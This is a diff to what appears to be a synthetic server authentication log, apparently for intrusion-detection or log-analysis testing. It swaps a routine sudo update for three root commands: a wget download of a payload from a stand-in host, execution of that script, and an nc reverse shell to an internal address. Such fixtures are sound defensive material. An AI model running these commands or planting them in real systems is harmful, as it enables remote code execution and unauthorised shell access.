@@ -32,7 +32,9 @@ Mar 15 01:10:09 server1 sshd[12383]: Failed password for admin from 10.0.0.99 po
 Mar 15 01:10:12 server1 sshd[12384]: Failed password for admin from 10.0.0.99 port 22
 Mar 15 01:10:15 server1 sshd[12385]: Failed password for admin from 10.0.0.99 port 22
 Mar 15 01:15:00 server1 sshd[12390]: Accepted password for admin from 172.16.0.50 port 22
-Mar 15 01:15:30 server1 sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 15 01:15:30 server1 sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://malicious.evil.com/payload.sh -O /tmp/payload.sh
+Mar 15 01:15:45 server1 sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash /tmp/payload.sh
+Mar 15 01:16:10 server1 sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/nc 172.16.0.50 4444 -e /bin/bash
 Mar 15 08:30:00 server1 sshd[12400]: Accepted publickey for devops from 10.10.10.5 port 22
 Mar 15 08:30:15 server1 sshd[12401]: pam_unix(sshd:session): session opened for user devops
 Mar 15 09:00:00 server1 sshd[12410]: Accepted publickey for developer from 10.10.10.10 port 22
